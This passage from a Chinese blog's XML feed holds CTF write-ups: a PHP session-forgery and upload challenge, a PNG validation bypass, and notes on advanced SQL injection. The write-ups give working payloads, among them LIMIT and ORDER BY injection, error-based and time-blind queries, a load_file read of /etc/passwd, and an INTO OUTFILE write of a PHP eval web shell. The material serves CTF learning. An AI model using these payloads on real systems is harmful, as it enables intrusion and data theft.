class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_save_path(&quot;/var/babyctf/&quot;);</span><br><span class="line">session_start();</span><br><span class="line">require_once &quot;/flag&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=&#x27;/var/babyctf/success.txt&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, &#x27;direction&#x27;);</span><br><span class="line">$attr = filter_input(INPUT_POST, &#x27;attr&#x27;);</span><br><span class="line">$dir_path = &quot;/var/babyctf/&quot;.$attr;</span><br><span class="line">if($attr===&quot;private&quot;)&#123;</span><br><span class="line">    $dir_path .= &quot;/&quot;.$_SESSION[&#x27;username&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">if($direction === &quot;upload&quot;)&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid upload&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#x27;up_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, 0700, TRUE);</span><br><span class="line">        if(move_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;],$file_path))&#123;</span><br><span class="line">            $upload_result = &quot;uploaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; elseif ($direction === &quot;download&quot;) &#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, &#x27;filename&#x27;));</span><br><span class="line">        $file_path = $dir_path.&quot;/&quot;.$filename;</span><br><span class="line">        if(preg_match(&#x27;/(\.\.\/|\.\.\\\\)/&#x27;, $file_path))&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;invalid file path&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!file_exists($file_path)) &#123;</span><br><span class="line">            throw new RuntimeException(&#x27;file not exist&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        header(&#x27;Content-Type: application/force-download&#x27;);</span><br><span class="line">        header(&#x27;Content-Length: &#x27;.filesize($file_path));</span><br><span class="line">        header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.substr($filename, 0, -65).&#x27;&quot;&#x27;);</span><br><span class="line">        if(readfile($file_path))&#123;</span><br><span class="line">            $download_result = &quot;downloaded&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;error while saving&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码审计后发现，想要拿到flag，必须符合两个条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、$_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;</span><br><span class="line">2、指定目录下存在success.txt文件。</span><br></pre></td></tr></table></figure><p>设置了两个post提交的参数direction、attr。</p><p>首先看看当direction分别为upload和download时的功能</p><p>upload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先判断是否正常上传，如果是正常上传，则在$dir_path下拼接文件名之后再加一个_再拼接文件名的sha256的值。同时限制了目录穿越，创建相应的目录，把文件上传到目录下。</span><br></pre></td></tr></table></figure><p>很明显upload不能实现上传success.txt文件到该目录下。</p><p>download：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取文件名，并且拼接到$file_path，这里也限制了目录穿越，判断是否存在，存在就返回文件内容。</span><br></pre></td></tr></table></figure><p>总体的思路，我们需要伪造session，并且成功上传success文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php的session默认存储文件名是sess_+PHPSESSID的值</span><br></pre></td></tr></table></figure><p>我们要先找到PHPSESSID的为admin的值，先尝试获取一下我们当前的PHPSESSID的值代表什么。</p><p>读取当前的session默认存储文件名的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">direction=download&amp;attr=&amp;filename=sess_f33a3215af31bd09f6fb9dae436fffe9</span><br></pre></td></tr></table></figure><p>返回的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usernames:5:&quot;guest&quot;;</span><br></pre></td></tr></table></figure><p>username前面存在不可见字符，了解到[不同引擎对应的session存储方式不同](<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制 | Spoock</a>)</p><p>这里的存储方式为php_binary，我们在本地生成我们要伪造的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;H:\\php&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><p>成功生成文件，并将文件名改为sess，再输出文件经sha256处理的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br></pre></td></tr></table></figure><p>我们再上传文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://b0f525a6-b5de-44b7-858f-78c945279423.node4.buuoj.cn/&quot;</span><br><span class="line">files=&#123;</span><br><span class="line">    &quot;up_file&quot;:open(&#x27;H:\php\sess&#x27;,&#x27;rb&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    &quot;direction&quot;:&quot;upload&quot;,</span><br><span class="line">    &quot;attr&quot;:&quot;&quot;,</span><br><span class="line">    &quot;filename&quot;:&quot;sess&quot;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data,files=files)</span><br></pre></td></tr></table></figure><p>读取一下，成功返回admin，我们现在就只要创建success.txt就可以了。</p><p>我们发现文件名设置不了，注意函数file_exists，他不仅检查还包括目录，我们可以直接创建success.txt目录，再将sess上传到该目录下即可绕过判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://b0f525a6-b5de-44b7-858f-78c945279423.node4.buuoj.cn/&quot;</span><br><span class="line">files=&#123;</span><br><span class="line">    &quot;up_file&quot;:open(&#x27;H:\php\sess&#x27;,&#x27;rb&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    &quot;direction&quot;:&quot;upload&quot;,</span><br><span class="line">    &quot;attr&quot;:&quot;success.txt&quot;,</span><br><span class="line">    &quot;filename&quot;:&quot;sess&quot;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data,files=files)</span><br></pre></td></tr></table></figure><p>最后修改PHPSESSID的值得到flag。</p><h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>审计一下upload.php源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">require_once(&#x27;config.php&#x27;);</span><br><span class="line">require_once(&#x27;lib/util.php&#x27;);</span><br><span class="line">require_once(&#x27;lib/session.php&#x27;);</span><br><span class="line"></span><br><span class="line">$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);</span><br><span class="line"></span><br><span class="line">// check whether file is uploaded</span><br><span class="line">if (!file_exists($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">  error(&#x27;No file was uploaded.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file size</span><br><span class="line">if ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 256000) &#123;</span><br><span class="line">  error(&#x27;Uploaded file is too large.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file type</span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line">if (!in_array($type, [&#x27;image/png&#x27;])) &#123;</span><br><span class="line">  error(&#x27;Uploaded file is not PNG format.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file width/height</span><br><span class="line">$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span><br><span class="line">  error(&#x27;Uploaded image is too large.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  // I hope this never happens...</span><br><span class="line">  error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ok</span><br><span class="line">$filename = bin2hex(random_bytes(4)) . &#x27;.png&#x27;;</span><br><span class="line">move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_DIR . &#x27;/&#x27; . $filename);</span><br><span class="line"></span><br><span class="line">$session-&gt;set(&#x27;avatar&#x27;, $filename);</span><br><span class="line">flash(&#x27;info&#x27;, &#x27;Your avatar has been successfully updated!&#x27;);</span><br><span class="line">redirect(&#x27;/&#x27;);</span><br></pre></td></tr></table></figure><p>注释都给提示，突破口就在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  // I hope this never happens...</span><br><span class="line">  error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看看函数[getimagesize](<a href="https://www.php.net/manual/zh/function.getimagesize.php">PHP: getimagesize - Manual</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getimagesize — 取得图像大小</span><br><span class="line">索引 0 给出的是图像宽度的像素值</span><br><span class="line">索引 1 给出的是图像高度的像素值</span><br><span class="line">索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</span><br><span class="line">索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签</span><br><span class="line">索引 bits 给出的是图像的每种颜色的位数，二进制格式</span><br><span class="line">索引 channels 给出的是图像的通道值，RGB 图像默认是 3</span><br><span class="line">索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header(&quot;Content-type: image/jpeg&quot;);</span><br></pre></td></tr></table></figure><p>再看看函数[finfo_file](<a href="https://www.php.net/manual/en/function.finfo-file.php">PHP: finfo_file - Manual</a>)，由于其主要识别PNG文件十六进制的第一行信息，我们保留第一行的信息，即可绕过两个函数，得到flag。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;EIS-2019-EzPOP&quot;&gt;&lt;a href=&quot;#EIS-2019-EzPOP&quot; class=&quot;headerlink&quot; title=&quot;[EIS 2019]EzPOP&quot;&gt;&lt;/a&gt;[EIS 2019]EzPOP&lt;/h2&gt;&lt;p&gt;—easypop没有那么easy&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SQL注入进阶</title>
    <link href="http://example.com/2021/06/02/CTF-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/"/>
    <id>http://example.com/2021/06/02/CTF-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/</id>
    <published>2021-06-02T13:45:04.000Z</published>
    <updated>2021-07-27T01:44:19.925Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CTF-SQL注入进阶"><a href="#CTF-SQL注入进阶" class="headerlink" title="CTF-SQL注入进阶"></a>CTF-SQL注入进阶</h3><h4 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h4><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实际程序中，常需要查询某些符合条件的具体数量的记录。此时mysql中提供limit帮助用户返回数据表中的多条记录。如：网站无法在一个页面中显示所有信息条目，此时采用分页显示。</span><br></pre></td></tr></table></figure><p>limit语法，前面文章介绍过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">limit 从起始位置，取多少条记录。起始位置为0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from users limit 1 offset 0</span><br><span class="line">读取一条记录，从第一条开始。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>MYSQL LIMIT 注入原理</strong></p><p>适用于mysql5.6版本一下。</p><p>通过联合注入，其实就跟联合注入没什么区别，但是加上order by就不一样了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users limit 0,1 union select 1,2,3</span><br></pre></td></tr></table></figure><p>sql修改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by id limit 0,1;</span><br><span class="line"></span><br><span class="line">此时无法使用union联合查询注入，由于order by 后无法使用union，无法利用联合注入。</span><br></pre></td></tr></table></figure><p>报错注入</p><p>原sql语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by id limit &#123;$id&#125;,1;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>语法功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对结果进行排序操作，mysql提供了order by 进行查询结果的排序，</span><br><span class="line">默认升序，添加降序desc。</span><br></pre></td></tr></table></figure><p>一些相关操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可使用字段名排序</span><br><span class="line">select * from users order by username;</span><br><span class="line">使用数字进行排序</span><br><span class="line">selcet * from users order by 2;</span><br><span class="line">两者查询结果相同</span><br></pre></td></tr></table></figure><p><strong>可通过order by 盲注出密码。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">密码为abc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=admin&#x27; union select 1,2,&#x27;a&#x27; order by 3#&amp;password=123</span><br><span class="line">由于a小于abc，a所在行数据上移动，用户名报错。</span><br><span class="line">b大于abc，密码报错。</span><br><span class="line">admin行数据上移动，得到正确的admin，密码报错。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="order-by-后注入"><a href="#order-by-后注入" class="headerlink" title="order by 后注入"></a>order by 后注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">selcet * from users order by id</span><br><span class="line">selcet * from users order by 1</span><br><span class="line">两者返回结果相同</span><br></pre></td></tr></table></figure><p>通过报错猜字段名、字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username(字段名)</span><br><span class="line">6(列数)</span><br></pre></td></tr></table></figure><p>sql语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by &#123;$order&#125;</span><br></pre></td></tr></table></figure><p><strong>注入点利用方式</strong></p><p>发现order by型，通过输入不同字段名，排序发生改变。</p><p>报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order=updatexml(1,concat(0x7c,database()),1)</span><br></pre></td></tr></table></figure><p>时间盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order=if(length(database())&gt;8,sleep(1),1)</span><br></pre></td></tr></table></figure><h4 id="sql-读写文件"><a href="#sql-读写文件" class="headerlink" title="sql-读写文件"></a>sql-读写文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可对本地文件系统进行读写操作。</span><br></pre></td></tr></table></figure><p>若flag不存在数据库中，此时考虑sql注入的读写文件操作。</p><p>MYSQL配置读写权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">配置权限针对具体用户，查询当前用户</span><br><span class="line"></span><br><span class="line">select current_user();</span><br><span class="line">返回user=root</span><br><span class="line">host=localhost</span><br></pre></td></tr></table></figure><p><strong>1、查看当前用户文件操作权限(File_priv)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select File_priv from mysql.user where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure><p>返回Y，表示具有对本地文件系统的读写操作。</p><p><strong>2、数据库导入导出权限(secure_file_priv)</strong></p><p>查看(secure_file_priv)变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show VARIABLES like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><p>当(secure_file_priv)为空时，表示无限制，若为NULL，表示没有任何权限。</p><p>如果(secure_file_priv)为一个路径，表示只有对该路径的导入导出权限。</p><p><strong>读文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;/etc/passwd&quot;)</span><br></pre></td></tr></table></figure><p><strong>写入一句话木马</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[1]);?&gt;&quot; into outfile &#x27;相关路径&#x27;</span><br></pre></td></tr></table></figure><p>​    </p><p>补充：</p><p>当concat函数被过滤时，可使用<a href="https://blog.csdn.net/qq_41725312/article/details/83039525">make_set函数</a></p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select extractvalue(2,make_set(3,0x7e,(select * from flag))))--+</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;CTF-SQL注入进阶&quot;&gt;&lt;a href=&quot;#CTF-SQL注入进阶&quot; class=&quot;headerlink&quot; title=&quot;CTF-SQL注入进阶&quot;&gt;&lt;/a&gt;CTF-SQL注入进阶&lt;/h3&gt;&lt;h4 id=&quot;limit注入&quot;&gt;&lt;a href=&quot;#limit注入&quot; class=&quot;headerlink&quot; title=&quot;limit注入&quot;&gt;&lt;/a&gt;limit注入&lt;/h4&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-脚本基础</title>
    <link href="http://example.com/2021/06/01/CTF-%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/06/01/CTF-%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/</id>
    <published>2021-06-01T03:06:42.000Z</published>
    <updated>2021-07-27T01:38:41.240Z</updated>
    
    <content type="html"><![CDATA[<h3 id="python脚本基础"><a href="#python脚本基础" class="headerlink" title="python脚本基础"></a>python脚本基础</h3><p><strong>requests库使用</strong></p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line"></span><br><span class="line">req=requests.get(url)</span><br><span class="line">req.encoding=&#x27;utf-8&#x27;#修改编码</span><br><span class="line">print(req.text)#输出字符串</span><br><span class="line">print(req.content)#输出字节类型</span><br><span class="line">把字节转化成字符串</span><br><span class="line">print(req.content.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure><p><strong>requests模块介绍</strong></p><p>请求-响应都是对象</p><p>请求：get、post方法进行http请求</p><p>User-Agent为浏览器标识，网站根据User-Agent的值判断是否是浏览器的请求，前面在学习python爬虫的时候，就需要伪装浏览器进行内容的爬取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;&quot;User-Agent&quot;:&quot;xxx&quot;&#125;</span><br><span class="line">request.get(url,headers=headers)</span><br></pre></td></tr></table></figure><p><strong>响应：属性获取响应的内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">响应状态码</span><br><span class="line">req.status_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应-请求头</span><br><span class="line">req.request.headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应头</span><br><span class="line">req.headers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应-请求cookie</span><br><span class="line">req.request._cookies</span><br><span class="line"></span><br><span class="line">响应cookie</span><br><span class="line">req.cookies</span><br></pre></td></tr></table></figure><p><strong>python与burp联动代理</strong></p><p>python设置代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.get(url,proxies=proxies)</span><br></pre></td></tr></table></figure><p><strong>带参数的HTTP GET请求</strong></p><p>1、url直接设置提交参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://www.baidu.com?wd=helloworld&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.get(url,proxies=proxies)</span><br></pre></td></tr></table></figure><p>2、通过params字典提交参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">params=&#123;&quot;wd&quot;:&quot;helloworld&quot;&#125;</span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span 